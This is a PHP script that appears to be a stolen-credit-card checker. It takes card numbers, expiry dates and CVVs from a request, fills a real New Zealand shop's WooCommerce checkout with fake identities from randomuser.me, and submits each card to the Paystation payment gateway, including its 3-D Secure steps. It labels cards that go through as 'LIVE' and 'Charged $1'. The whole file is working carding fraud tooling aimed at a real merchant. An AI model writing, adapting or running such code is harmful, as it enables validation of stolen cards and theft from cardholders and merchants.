<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 12)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $cookie = RandomString();

    $randomShits = file_get_contents('https://randomuser.me/api?nat=nz');
    $data = json_decode($randomShits, true);
    $fname = $data['results'][0]['name']['first'];
    $lname = $data['results'][0]['name']['last'];
    $street = $data['results'][0]['location']['street']['number']." ".$data['results'][0]['location']['street']['name'];
    $city = $data['results'][0]['location']['city'];
    $state = preg_replace('/[^A-Z]/', '', $data['results'][0]['location']['state']);
    $postcode = $data['results'][0]['location']['postcode'];
    $phone = $data['results'][0]['phone']; 
    $username = $data['results'][0]['login']['username'];

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://cookiekitchen.co.nz/shop/coloured-noodle-boxes/',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: multipart/form-data; boundary=----WebKitFormBoundary3BiYS0p9HRdsn6i0',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "------WebKitFormBoundary3BiYS0p9HRdsn6i0\r\nContent-Disposition: form-data; name=\"attribute_size\"\r\n\r\nred mini, $1.00\r\n------WebKitFormBoundary3BiYS0p9HRdsn6i0\r\nContent-Disposition: form-data; name=\"quantity\"\r\n\r\n1\r\n------WebKitFormBoundary3BiYS0p9HRdsn6i0\r\nContent-Disposition: form-data; name=\"add-to-cart\"\r\n\r\n8229\r\n------WebKitFormBoundary3BiYS0p9HRdsn6i0\r\nContent-Disposition: form-data; name=\"product_id\"\r\n\r\n8229\r\n------WebKitFormBoundary3BiYS0p9HRdsn6i0\r\nContent-Disposition: form-data; name=\"variation_id\"\r\n\r\n8234\r\n------WebKitFormBoundary3BiYS0p9HRdsn6i0--"
    ));
    curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://cookiekitchen.co.nz/shop-online/checkout/',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        )
    ));
    $nonce = GetStr(curl_exec($ch), 'name="woocommerce-process-checkout-nonce" value="', '"');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://cookiekitchen.co.nz/?wc-ajax=checkout',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: application/json, text/javascript, */*; q=0.01',
            'content-type: application/x-www-form-urlencoded; charset=UTF-8',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "billing_country=NZ&billing_first_name=$fname&billing_last_name=$lname&billing_company=&billing_address_1=$street&billing_address_2=NA&billing_city=$city&billing_state=$state&billing_postcode=$postcode&billing_email=$username@gmail.com&billing_phone=$phone&account_password=&shipping_country=NZ&shipping_first_name=&shipping_last_name=&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=AK&shipping_postcode=&additional_fld1=&additional_wooccm3=2021-07-02&order_comments=&shipping_method%5B0%5D=local_pickup%3A34&payment_method=threeparty&terms=on&terms-field=1&woocommerce-process-checkout-nonce=$nonce&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review"
    ));
    $hk = GetStr(curl_exec($ch), '?hk=', '"');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://payments.paystation.co.nz/hosted/ajax.php?hk='.$hk,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/plain, */*; q=0.01',
            'content-type: application/x-www-form-urlencoded; charset=UTF-8',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "stage=hosted_payment&card_number=$cc&card_expiry=".substr($yy, 2, 4)."$mm&card_security=$cvv&card_name=undefined"
    ));
    $itlog = curl_exec($ch);
    curl_close($ch);

    $acsurl = json_decode($itlog, true)['acsurl'];
    $pareq = json_decode($itlog, true)['pareq'];
    $termUrl = json_decode($itlog, true)['termurl'];
    $md = json_decode($itlog, true)['md'];

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $acsurl,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "PaReq=".urlencode($pareq)."&MD=".urlencode($md)."&TermUrl=".urlencode($termUrl)
    ));
    $pares = GetStr(curl_exec($ch), '<input type="hidden" name="PaRes" value="', '"');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $termUrl,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "PaRes=".urlencode($pares)."&MD=".urlencode($md)
    ));
    curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://payments.paystation.co.nz/hosted/ajax.php?hkc=".GetStr($termUrl, 'hkc=', '&'),
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/plain, */*; q=0.01',
            'content-type: application/x-www-form-urlencoded; charset=UTF-8',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "stage=hosted_payment_lookup"
    ));
    $execute = curl_exec($ch);
    curl_close($ch);

    $ecode = GetStr($execute, '"error_code":"', '"');
    $message = GetStr($execute, '"error_message":"', '"');
    $response = "$ecode: $message";

    if(strpos($execute, '"successful":true')) {

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Charged $1</span></td></tr><br>';

    } else {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$response.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';

    }
    unlink("$cookie.txt");
?>
